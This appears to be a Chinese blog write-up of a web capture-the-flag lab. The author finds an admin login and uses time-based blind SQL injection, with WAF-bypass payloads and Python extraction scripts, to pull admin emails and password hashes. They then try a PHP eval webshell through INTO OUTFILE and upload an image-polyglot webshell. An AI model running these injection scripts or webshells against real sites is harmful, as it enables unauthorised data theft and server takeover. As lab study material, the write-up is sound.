<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lqhDiSD9ZxqCtuaEu3dqmw)

**“** 某天，群里有个小伙伴分享了一个靶场，许久没打靶的我，逐渐的产生了一丝兴趣... 于是，故事开始了...**”**

**本文为实战记录，并非攻略，且此次打靶除使用 GPT 帮写部分脚本外，几乎没有使用百度等网络资源。**

**所以文中会包含大量的思路描述与试错过程，不要觉得无聊，试错才是积累经验最快的方式。**

**文章比较长，为了提高文章质量，一些必要性不大的截图修改为了文字描述。  
**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJAxfW7BHu4as7kMexg7QN5bAu94vK9Eu6HTrchgdubYGms5IpmRA0pQ/640?wx_fmt=png&from=appmsg)

01

—

信息收集

第一步，打开浏览器开发者模式，访问靶场，针对每个可以访问到的页面文本、HTML 源码开展信息收集。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJVDlEWY7QaYsfAsvNgvt8JwVVhGAYdqdm3dyH1ey7L8aZAdrlTcpDow/640?wx_fmt=png&from=appmsg)

index.php 收集到信息如下：

1.  （页眉文本）电话号码： +254 002 100 500  
    
2.  （页眉文本）邮箱地址：info@example.com
    
3.  （HTML 源码）邮箱实际指向：info@Companyonline.net
    
4.  （源码注释）author：Ethredah
    
5.  （源码注释）URL：http://ethredah.github.io
    
6.  （页脚文本）邮箱输入框，根据英文描述，输入邮箱可以订阅最新消息
    

about.php 收集到信息如下：

1.  （页面文本）：flag 格式为 Flag{xxxxx-xxxxx-xxxxx-xxxxx}  
    
2.  （页面文本）：禁止使用 Web 扫描、端口扫描、DDOS 等  
    
3.  （页面文本）：可以使用轻量级目录扫描
    

portfolio.php 收集到的信息如下：

无

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJib8csL3pWlyIcVkCBM13NhkXZ8fItYk8EBusDtAgzp3vv8krjYyxB2g/640?wx_fmt=png&from=appmsg)

blog.php 收集到的信息如下：  

1.  （页面文本）用户名：Admin
    
2.  （页面文本）生日：2019-10-27
    
3.  （页面文本）密码：p3ssw0rd
    
4.  （页面超链接 / HTML 源码）single.php 页面，参数 ?id=xxx
    

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJF2bxk72ZEwU4JJ5euENnou5GtnhMAvlZxdaA7HDdMDrRvXIzhn1e6Q/640?wx_fmt=png&from=appmsg)

contact.php 收集到的信息如下：

1.  （页面文本）一个表单，可提交 name、email、message，且 message 是个富文本；
    
2.  （HTML 源码）表单是个 post 请求，且目标 url 为 /functions/contact.php
    

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJiajCMZsflwGiachwlH4NVk6Yd8QSVAJ0w1y8hyfkfCfzRGbBaXZ4ZdHQ/640?wx_fmt=png&from=appmsg)

single.php 收集到的信息如下：  

1.  （页面文本）一个表单，name、comment，且 comment 是富文本；
    
2.  （HTML 源码）表单是 post 请求，且目标 url 为 /functions/comment.php
    

02

—  

分析收集结果

分析整理上一步中收集到的结果：

1.  index.php 的注释中发现 github 链接，这极有可能是开源项目二次开发，如果能拿到源码，那必然事半功倍。（_结果：404. 或许曾经有，但现在 github 上确实没有了_）
    
2.  github 链接 404 了，但是还有作者名，直接搜索了一下作者大名 Ethredah，果然，首页一个名为 PHP-Blog-Admin 的项目，点进去之后项目结构与之前收集的页面名称极其相似（_结果：为了让题目有点挑战性，决定先不看，实在没有头绪了再看_）。
    

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJmK0u0KlRZKdPU5xZ2Y7RLicFp6fMRpywNo89rwxgCck3SR0V72VDl7g/640?wx_fmt=png&from=appmsg)

4.  顺手在页脚的 “订阅邮箱” 尝试了收集到的两个邮箱和自己的个人邮箱（_结果：抓包后发现请求返回 200，但多次尝试，并未收到任何信件_）
    
5.  about.php 提示可以轻量级目录爆破，对根目录进行目录爆破。（_结果：并没有什么新的发现_）
    
    ![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJ63ia14gbt9KibHZP20nPlFcFDiauibomj3uQibfVJaOib7HK1adKwXWO2qCw/640?wx_fmt=jpeg)
    
      
    

**思考：**

根据 github 上的项目名称描述，这应该是个**博客网站**，很有可能结构与 wordpress 类似，那也就大概率会存在一个类似于 wp-admin 的**后台管理界面**。

而且既然是靶场，那 flag 极大概率是在服务器某个目录下（极小概率的入门级靶场才会隐藏在客户端源码内），要读取服务器文件，那要重点关心的就四个点：**1. 文件上传；2. 文件包含；3. SQL 注入；4. 越权接口**

**结合目前获取到的信息，需要重点关注的有三个点：**

1.  能否找到后台管理界面？
    
2.  两个 form 表单是否会存在 SQL 注入？（_富文本域无法上传图片附件，XSS 即使存在目前看来利用价值也不高，所以暂时不必优先关心_）
    
3.  single.php 页面传递了一个参数 id，似乎为博客 id，是否存在注入可能？
    
4.  functions 目录下存在一些接口（_已知的有 2 个_），是否可以越权调用，是否还能找到其他的类似接口？
    

03

—  

寻找入口  

**目标：**找到后台登录地址；

找后台地址，首先想到的必须是 robots.txt 文件，直接尝试访问：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJFsO4oWIlxBacbiatIvgRNh7uvPas2SXlKXXDSXoPiad3ichytNFic6gFLw/640?wx_fmt=png&from=appmsg)

居然 disallowed 了 /1234 目录，不知何意，尝试访问发现 404，完全没有意义。  

既然 robots.txt 中没有，那就只能再次进行目录扫描了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJia20F5fKsXxFVROMMN5IJrVn6l8DTEOAh94Y24471WEOSkGzZDIQOyA/640?wx_fmt=png&from=appmsg)

有新发现

```
/Company_admin/login.php
/Company_admin/index.php

```

index.php 页面首次访问时返回了文本信息： "hold on"，猜测应该是包含一个请求，由于参数不正确所以才会如此回显

login.php 页面则直接为后台登录页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OOSDSBN9eQMlLiaTw6EQriaaJonCsuvWLIgCNljBFRW5TfAh7fHs6RZ2Pic32AXaN4Bw0sFDYHEIok0A/640?wx_fmt=png&from=appmsg)

登录表单共需要 4 个参数：邮箱、密码、4 位数字码、验证码  

post 请求，最终提交到 /Company_admin/login.php

并且，还有两个新发现！

一个被注释掉的表单（如上图），根据标题可以推测是 “重置密码” 的表单，post 请求，提交到 /Company_admin/index.php 页面。

两个被注释掉的字段，在 “验证码” 与“Login”按钮中间（但观察代码似乎并无价值）

不过。尝试多次请求，发现验证码有效无法绕过，也就是说无法使用大字典进行爆破了。  

整合上面收集到的信息

```
# 用户名
Admin
Ethredah
# 邮箱
info@example.com
info@Companyonline.com
# 还记的之前页脚有一个订阅邮箱，我填了自己的邮箱（这里脱敏），虽然返回了 200，但并没有收到任何信息，但这个邮箱也不能忘了尝试，万一是创建了账号呢
xxx@xxx.com  
# 生日
20191027
# robots 文件
1234
# 密码
p3ssw0rd

```

组成一个针对性的字典

```
# 邮箱
info@example.com
info@Companyonline.com
admin@Companyonline.com
admin@example.com
Ethredah@example.com
xxx@xxx.com
# 密码
p3ssw0rd
123456
# 4位数字
1234
2019
1027
1910

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbcBWMq5XHoH8XiaxriaV9AzloShmDSuPhYPthBnkA5G4JjYewDBB8Sp7w/640?wx_fmt=png&from=appmsg)

多次尝试之后，发现回显信息都为 No account found with that email  

邮箱是不正确的  

那接下来准备将 HTML 源码中的注释取消，尝试一下这个所谓的 “重置密码” 表单

直接右击，以 “HTML 格式修改”，然后删掉最前面的注释符号 <!--

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb8oEPzszcHvk3GykbO2lEZDIGA0OsUwEehrG6UUbsMxajOkzz5AOBQQ/640?wx_fmt=png&from=appmsg)

回车确认，发现 HTML 中代码的颜色已经变了（说明不再作为注释了），但左侧页面中 form 表单并未展示出来  

仔细看，下方的样式栏位，还有一个 display: none 的属性，这是 “不展示” 的意思，鼠标放上去，**取消**前面的√，让它展示出来。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbjWs51ZIvtK1OcytI3FOPGe99rjMmIcHBXWIxEvvUW2R0G1ZOfW6Kicg/640?wx_fmt=png&from=appmsg)

可以看到左侧页面中已经出现了 “Recover Password” 字样，但是下方应该还有个 “Submit” 按钮没显示出来。

直接用同样的方法，把 Login 表单 display:none  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb8K3v8EDuTCDZBXS4keFuRyS4vGI2SiaATcicISBkeevwlQktlzRicsUQw/640?wx_fmt=png&from=appmsg)

输入一个邮箱，点击 Reset，发现请求是 200 成功的，但没有任何后续（比如输入新密码），输入自己的邮箱，也没有收到任何信件。

抓包发现，请求包没有任何参数的（email 没有被作为参数传递）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbP3CHsj7I1P1OhMn3qwdIWSLocrEagLG0gGH18KObhE8s4JqwQjcGmA/640?wx_fmt=png&from=appmsg)

检查页面发现，input 标签没有 name 属性，难怪，右键，添加一个属性，name = "email"，再次尝试（也可以直接在 bp 中加上 name 属性重发）

我比较喜欢在页面上操作去发送请求，然后在 BP 里面只改参数值，因为这样可以避免考虑参数的传参格式、请求类型等问题。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbxSyh1A2vQKYrpCPj6RsQTzzxq5aWRx77q59P8GoxdSTa1au8XIHqvA/640?wx_fmt=png&from=appmsg)

抓包看到参数正常传递了，但是依然没有效果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbsSrRT7r6qBRFiaDVwAPfMl8xD6FJ0MKYicic1EYcXMRLkggB1gcokVXOQ/640?wx_fmt=png&from=appmsg)

思考 ing ......

休息一下

04

—  

SQL 注入  

既然隐藏的表单无效，那就不在这里较真了。  

按照最开始分析的思路，需要关注 4 个点：1. 文件上传；2. 文件包含；3. SQL 注入；4. 越权接口

现在，后台登录入口已经找到，那么 “文件上传”、“文件包含” 这两个功能，大概率是会在后台管理模块，并且：

“文件上传” 功能很可能是在后台管理的 “头像上传”、“博客内附件上传”、“博客静态资源上传” 中；

“文件包含”功能很可能是在 “博客模板包含”、“博客主题自定义” 中；  

想到这里，心中已经开始提前激动了![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/Expression/Expression_93@2x.png)  

那现在剩下的关注点就已经明确了：SQL 注入、越权接口

先从 SQL 注入下手  

回看之前收集的信息，在 blog 页面，收集到一个 single.php?id=xxx 的页面，这是从博客列表，进入博客详情的页面，而 id，基本可以确认就是博客的 id。

看到这个 ?id=xxx 的 url 结构，标准的 SQLMap 示例语句，这谁忍得住呀？

说实话最开始看到的时候我就想试它了，但一直觉得肯定有个后台入口，就强忍着内心的蠢蠢欲动先去探索后台入口了。  

现在，终于

依稀记得，好像没说不能用 SQLMap 扫描吧？

开整

emmm![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Shocked.png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbz2Cp5ebO1xP2XxUIibIASQwrqO0nh6Po4WAIiaHq3cb06gmK1S5X2ULg/640?wx_fmt=png&from=appmsg)

这里居然没有注入点？

试试上面收集到的几个表单（全部注入失败）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbYsv95ZgSHyCEKIYzl1S6FicC3l2O50r6Q39NgXPa9rqJ3PnxrLvbL5g/640?wx_fmt=png&from=appmsg)

看到一连串的提示

沉浸式思考了许久，觉得最有可能的，还是最开始的 single.php?id=xxx

于是开始了漫长的折腾......  

```
sqlmap -u http://xx.xxx.xxx.xx:xxxxx/single.php?id=1 --technique B
sqlmap -u http://xx.xxx.xxx.xx:xxxxx/single.php?id=1 --technique T
sqlmap -u http://xx.xxx.xxx.xx:xxxxx/single.php?id=1 --technique S
sqlmap -u http://xx.xxx.xxx.xx:xxxxx/single.php?id=1 --technique T --random-agent --tamper=space2comment
.....

```

无一例外

```
[WARNING] GET parameter 'id' does not seem to be injectable

```

不死心的我，决定弃用 sqlmap，直接祭出地表 SQL 注入最强的杀器组合：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbsuMJ5CJpTNRXB2cW3bFvnUKEhEHoCn79aroEjxNUibbEyESfuiaqCo8A/640?wx_fmt=png&from=appmsg)

先抓取一个正常的数据包  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbYjSicRgjaG8hkf2zWfDKicYLyrpNTHZFZKFiaVCftjsXQib2I1S0DczNyQ/640?wx_fmt=png&from=appmsg)

可以看到，参数 id 是个数字

猜测 SQL 语句

```
select * from blogs where id=1

```

这种数字类型参数，在先不考虑截断的情况下，首先想到的是三种构造方式：  

1.  union 构造。经过测试，只有 id = 5 和 id = 6 的时候，页面会返回内容，所以，只要构造时 id 不为 5 或者 6，那么 select 语句的结果就为 0 条记录，配合 union 函数，就可以在页面中展示出查询结果。但是有一个前提就是需要知道 select 语句的 column 数量；
    
2.  if 盲注。使用类似 if(condition, 5, 6) 来根据最终回显确定 condition 的 true 与 false；
    

开始尝试：  

不知道 select 语句的 column 数量，所以从 1 开始尝试（其中 blogs 表名只是示例，实际表名暂不清楚）  

```
select * from blogs where id = 1 union select 1
# 由于是 url 传参，将空格替换为 %20
# 要注入的参数就为： 1%20union%20select%201

```

有 WAF

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbofic3GrRcIEm1WCHiaG5BolSYAMofrFBb8NXiaj2n5ibsmyzP17f6smskQ/640?wx_fmt=png&from=appmsg)

分析：

这个 payload 涉及到的关键字和字符有：select、 union、 空格 (%20)

只有这三个，那么 WAF 到底拦截了哪个字符或者关键字？

其实很好确认，一个一个试（不需要构造正确的 SQL 语句），只试关键字和字符，如果页面报错或者为空，就说明 WAF 没有拦截；如果是刚才这个提示，就说明命中了 WAF 规则。  

就像这样：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb976yicu2GBEfQ40meibFBASGQ9qo6WmFcIesF8cTp2duVxaUVw4RVPHg/640?wx_fmt=png&from=appmsg)

%20 命中了 WAF；  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbibxdtbrbZysMft2eiavX4ATciaOzSaupdh1CSX8M8McHxdaVHC0ic6uu6w/640?wx_fmt=png&from=appmsg)

select 关键字却并未拦截；

同理 union 也命中了 WAF，被拦截了，而且尝试大小写、双写、编码绕过也失败了。  

陆续尝试了几个关键字之后，你猜怎么着？  

if、sleep、%0a 都没有命中 WAF  

也就是，理论上来说，是可以尝试时间盲注的，虽然不一定成功，但至少不会被 WAF 拦截。  

构造基础 SQL  

```
select * from blogs where id = if(true,sleep(1),sleep(2))
# %0a 替换空格（这个语句暂时还没空格，哈哈）

```

waiting....

当看到左下角的 waiting... 时...

可以说，头一次遇到网站卡了未响应，还这么兴奋的...  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbb4dXeugclvRjDxMWwibF64kCv3xl4XyfKZfg6CpVOyl3HKWTp9iceyVg/640?wx_fmt=png&from=appmsg)

成功找到了注入点。  

26 秒，如果这是单表查询，恒 true sleep(1) 的情况下，这个表大约有 26 条数据。  

既然有了注入点，那接下来就是构造 SQL 语句了

思路：库名、表名、字段名、密码

```
# 伪 SQL，在自己本地数据库构造的，目的是能正确识别 SQL 语法，减少不必要的语法错误
SELECT * FROM users WHERE id = if((length(database()))=15,sleep(1),sleep(2))

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbfYFpMAyKiaMslrQrUwicX12MLHe19lGmRlBKb24GXiamibuiaNmufXRWO9Q/640?wx_fmt=png&from=appmsg)

又被 WAF 拦截了  

同样的方法，测试得出：WAF 还拦截了 = 和 ' 

幸运的是：LIKE 关键字和 " 没有被拦截，还可以继续  

修改一下：  

```
SELECT * FROM users WHERE id = if((length(database()))LIKE(10),sleep(1),sleep(0.01))

```

尝试更换数据库名长度（10），结果试到 15 的时候，惊喜出现了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbQc4zicPKNdiadsU6PjPCMaSIVa6ZD3aJKzUjVqxP88Ix5LUMWXhGdVRg/640?wx_fmt=png&from=appmsg)

库名长度为 15。  

同理，来获取具体的库名，这得上脚本了，一个一个试要累死的。

写爆破脚本。基本思路：两层循环（第一层：substr 的起始位置；第二层：所有常见的字符），然后判断相应时长，如果超过 xxx 毫秒就输出，如果错误就下次循环。  

留意三个问题，我已经踩坑了，这里就不截图了

1.  由于使用 LIKE 替换 = 来绕过 WAF ，但是在 SQL 的 LIKE 中，% 和 _ 是两个特殊的匹配符，所以脚本要对这两个字符转义（_我是直接去除了这两个字符，因为我觉得数据库名、表名用到这两个字符的概率不高，赌一把，要是最后缺一两个字符再加上也不迟，临时用的脚本，目标是解题就行，并不需要脚本的健壮性_）；
    

_实践证明：我赌错了，库名还真就有下划线 _ ，不过因为脚本能看出来第三个字符没有匹配到，我就直接猜下划线了，脚本后来也没有加转义。_  

3.  大多数据库中，除字符串之外，是不区分大小写字母的；
    
4.  sleep 的时间最好错开明显一点，错误时小一些（因为错误的次数肯定比正确的多很多），正确时大一些，但是要根据实际情况调整，避免误判；  
    

脚本如下：  

```
import requests
import time
import string
target = 'http://xx.xxx.xxx.xx:xxxx/single.php'
for i in range(1, 16):
    # 排除掉 % 和 _ 因为这两个在 SQL 语句中 like 都可以匹配（建议给这俩字符加转义）
    for c in list(string.ascii_lowercase + string.digits + string.punctuation.replace('%', '').replace('_', '')):
        start_time = time.time()  
        payload = f'?id=if((substr(database(),{i},1))like("{c}"),sleep(0.5),sleep(0.01))'
        requests.get(target + payload, {})
        end_time = time.time()  # 记录请求结束时间
        response_time = end_time - start_time  # 计算响应时间
        if response_time > 1:
            print(f"第{i}个字符是：{c}")
            continue
        else:
            # print(f'不是 {c}')
            ...

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbzFKMkkVCpV4kNswKTLtTBJ4RPTeibUDXIvLUFrXcHKfI11DtPDLOzLw/640?wx_fmt=png&from=appmsg)

得到数据库名（图没截最新的）：hs_test_s1_blog

同样的原理，获取表名：

```
# 这里我尝试了另一种绕 空格 的方式，感兴趣的可以自己研究原理
if(substr((select(table_name)from(information_schema.tables)where(table_schema)like("hs\_test\_s1\_blog")),1,1)like("a%"),sleep(0.1),sleep(0.01))

```

这样查出来的 table_name 会有多条记录，不便于爆破，我本想结合 and 条件，但是没想到的是 and 关键字也没 WAF 拦截了。

于是，我直接猜，like "%user%"、"%admin%"、"%employ%" 的表名的 count 值

```
if((select(count(1))from(information_schema.tables)where(table_schema)like("hs\_test\_s1\_blog")and(table_name)like('%user%'))like(3),sleep(0.1),sleep(0.01))

```

结果，得到，以 user 开头的表名有 3 个，admin 开头的表名有一个

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb7bfvE96OBMnGQJXkoDiap4EtyfEWczXwEqlg3nEQ7xXkOKNZbVAhxibg/640?wx_fmt=png&from=appmsg)

user 和 admin 同时存在的情况下，admin 优先测试，并且，经过进一步确认，这张表完整名就为 admin

至于字段名，根据最开始看到的后台管理登录页面，可以猜到至少有 email、password 两个字段，还会有一个用户名的字段（已发布的博文中有个 Admin 应该就是用户名）可能是 name 或者 username、nikename 之类的，当然这个字段貌似暂时不重要。

现在要做的是，如何获取到 admin 表中的 email 和 password 字段的值。

而且目前确定可以用的方式就是 if + like + sleep，其他方式也懒得再去探索。

**思路：**

1.  先使用 count + like 的方式，根据 sleep 时间确定 admin 表有多少条记录（实际上可以直接进行 下一步）
    
2.  再使用 count + like + where email 条件，确认满足 email 条件的记录有多少条，我只需要确定一条唯一记录，就可以如法炮制的使用 substr + like 的方式爆破出 email 和 password
    

```
import requests
import time
url = "http://xx.xxx.xxx.xx:xxxxx/single.php?id="
database = "hs_test_s1_blog"
tables = []
for n in range(1,30):
    payload = f'if((select(count(1))from(hs_test_s1_blog.admin))like({n}),sleep(1),sleep(0.1))'
    start_time = time.time()  
    response = requests.get(url + payload)
    end_time = time.time() 
    response_time = end_time - start_time  
    print(str(response_time) + f': {n}')

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbKErJXR0KrIuMoUB9gibcyRMaaVHic2sfx2XDLgDMFvibYtXIXXUNH7X9A/640?wx_fmt=jpeg)

共有 13 条记录，接下来，修改 like 的条件，先以单字母为条件，如果单字母无法确定唯一记录，那再逐渐缩小范围。  

```
import requests
import time
import string 
url = "http://xx.xxx.xxx.xx:xxxxx/single.php?id="
database = "hs_test_s1_blog"
tables = []
# Get table names
for n in range(14):
    for c in list(string.ascii_lowercase + string.digits + string.punctuation.replace('%', '').replace('_', '')):
        payload = f'if(((select(count(1))from(hs_test_s1_blog.admin)where(email)like("%{c}%"))like({n})),sleep(0.1),sleep(0.01))'
        start_time = time.time()  
        response = requests.get(url + payload)
        end_time = time.time() 
        response_time = end_time - start_time  
        if response_time > 1:
            print(str(response_time) + f': {c}：{n}') # 有 n 条记录包含 c 字符

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbL8yXf1OXgibrtLOGIHmHh2lvG9SvrNdEvIkq3m7ctMmpmvZPeq2dW4A/640?wx_fmt=png&from=appmsg)

最终结果是这样的：

```
f：1
k：1
p：1
r：1
y：1
s：2
d：3
t：3
e：4
n：4
g：12
a：13
c：13
i：13
l：13
m：13
o：13
.：13
@：13

```

也就是说，所有的邮箱都包含了 a c i l m o . @ 这几个符号  

而包含 f k p r y 这五个字符的，都有且仅有一条记录，那随机选一个，将其作为 where 条件，就可以保证记录的唯一，从而爆破出完整的 email 和 password  

我就选择第一个 f 吧

先获取 email 长度  

```
import requests
import time
import string 
url = "http://xx.xxx.xxx.xx:xxxxx/single.php?id="
database = "hs_test_s1_blog"
tables = []
for n in range(50):
    payload = f'if(((select(length(email))from(hs_test_s1_blog.admin)where(email)like("%f%"))like({n})),sleep(1.1),sleep(0.01))'
    start_time = time.time()  
    response = requests.get(url + payload)
    end_time = time.time() 
    response_time = end_time - start_time  
    print(str(response_time) + f': {n}') 

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbCO4UicD7XlPZXyibibpKcgzwqIZv0vITyB0ObqcIOZFtsN0kDUR1ibc4xg/640?wx_fmt=jpeg)

长度为 18，再获取具体值  

```
import requests
import time
import string 
url = "http://xx.xxx.xxx.xx:xxxxx/single.php?id="
database = "hs_test_s1_blog"
tables = []
result = ''
for i in range(1,19):
    for c in list(string.ascii_lowercase + string.digits + string.punctuation.replace('%', '').replace('_', '')):
        payload = f'if(((select(substr(email,{i},1))from(hs_test_s1_blog.admin)where(email)like("%f%"))like("{c}")),sleep(0.1),sleep(0.01))'
        start_time = time.time()  
        response = requests.get(url + payload)
        end_time = time.time() 
        response_time = end_time - start_time 
        # print(str(response_time) + f': {i}： {c}') 
        if response_time > 1 :
            result = result + c
            print(str(response_time) + f': {i}： {c}') 
print('email: ' + result)

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbhqxEL8Koluot6lJ5Sg7ZoW5hPcsao6t9eVjIudsCibsMnGd7T67khnw/640?wx_fmt=png&from=appmsg)

想了想还是决定打个码，不介意吧  

同样的方式，将 email 换成 password，获取密码（代码我就不贴了）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbP3umk6Wrhic9FHF7gic8GeZ5zzUsOPticicGI9yAoAKWaAh1xarUAqppNg/640?wx_fmt=jpeg)

当看到密码的长度为 32 时，我就在猜它是否是个 MD5 的值了  

密码我也打个码昂，毕竟靶场别人还要玩儿的。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb70dDBGicXfER77c6EENnyoQ4ricsoT62N3ahseosrstFd4LqSa9YPxLg/640?wx_fmt=jpeg)

在线 MD5 解密  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb5YNofrxEDxfvibjMFCtqiaF8pp7hVqYFam06R0DAf7TT1XO68OXMsGibQ/640?wx_fmt=jpeg&from=appmsg)  

距离登录只有一步之遥，还剩一个四位数的 digits code 没有破解

试了一下，数据库中貌似没有这个字段  

那么，就用最开始收集的资料中的几个数字试一下，如果不正确再另做打算  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbQm78IQCibRMNBpRX5RjAV4B5trS34s1CSSUyp0xrFdOfthrCcHvac7g/640?wx_fmt=png&from=appmsg)

运气不错，四位数字果然是其中之一。  

没有看到文件上传点（_实际上有，但当时没发现_），头像也不能修改  

找了半天，在一个不起眼的地方发现了这个

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbCLtwt2TnAhc7GtfczdPA150IjOQKJCDpkIGWPXibOeoS7PPaUH2Pf9Q/640?wx_fmt=png&from=appmsg)  

template 模板，试试能不能文件包含  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbibfob2TUHHD3u60PMcJQYicC7Rn5pMicpz64tXsx2ubAU8kNbFrexLhMw/640?wx_fmt=png&from=appmsg)

还不错，但是，文件怎么写入呢？

试试利用之前的 SQL 注入能不能写入文件  

```
select(1,"<?php eval($_POST[cmd])?>")into%0aoutfile("/etc/test.php")

```

尖括号又被 WAF 拦截了，这 WAF 是真凶啊！  

毫不意外的 %3C 和 %3E 也被拦截

思考：  

直接先试一下能不能写入正常文本，如果正常文本都不能写入，那说明可能开启了 --security-file-priv， 那就要放弃 SQL 写入的思路了；如果能写入正常文本，那可以考虑将 SQL 语句能否在正常的富文本中提交到后端数据库，然后通过二次注入写入小马。

回显 200 成功。（忘了截图）

但是当我信心满满的跑去读取的时候，才发现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbibuU06ZVRbvQEyweLgy6Qz8yjal2WnT6HjNC3WJBUT1e8PAq0ibQia9Vw/640?wx_fmt=png&from=appmsg)

没写进去......

读取 .ssh 文件？  

读取 my.cnf 文件？

正当我在一筹莫展瞎折腾时

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmblFfQ4iaPmCJQ7Huf8FibqYsfpc9dLoJwT15YiafwxrZMBGVDOynv27RaA/640?wx_fmt=png&from=appmsg)

这里藏了一个文件上传！！！  翻了好几遍都没看到！白折腾半天

直接传马  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb01l2ynvZov7ibCPbhaHVf68364UJiaQIpWRiavmSJpibkbLsKnC7ymhicUw/640?wx_fmt=png&from=appmsg)

被拦了，意料之中  

后面经过测试，发现这个被拦截的弹窗，不是靶场的 WAF，而是本地的资源管理器识别到了木马，将本地目录加入可信名单后就不会有这个提示了，但是 php 后缀依然会被 WAF 拦截，所以就没有重新截图了。  

看来有文件类型限制，直接选几个正常文件（常见的无非就是 txt、png、jpg 这几种，偶而会有限制 xlsx、pdf 的，但很少见），试一下都允许什么格式？

结果：png、gif、jpg 都可以上传

小马改后缀绕过，失败  

上图片马  

```
copy 5a1aed622d5f45a6b259f08540580d45_0.jpg /b + test.php /a hhhooolllaaa.jpg

```

上传成功！  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbo8hfDzc5WsLHBciaR2qVS94vsQNPHjS19WDyuib6PWGqSYuoVtjLvqZA/640?wx_fmt=png&from=appmsg)

成功解析

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbGukdHiccTYuqBZJVia7Y8ASp3IN9ccm3z2OtgLqNP8hufn47Wh7bCbwg/640?wx_fmt=png&from=appmsg)

是时候拿出我 80m 长的菜刀和冰蝎、蚁剑、哥斯拉了

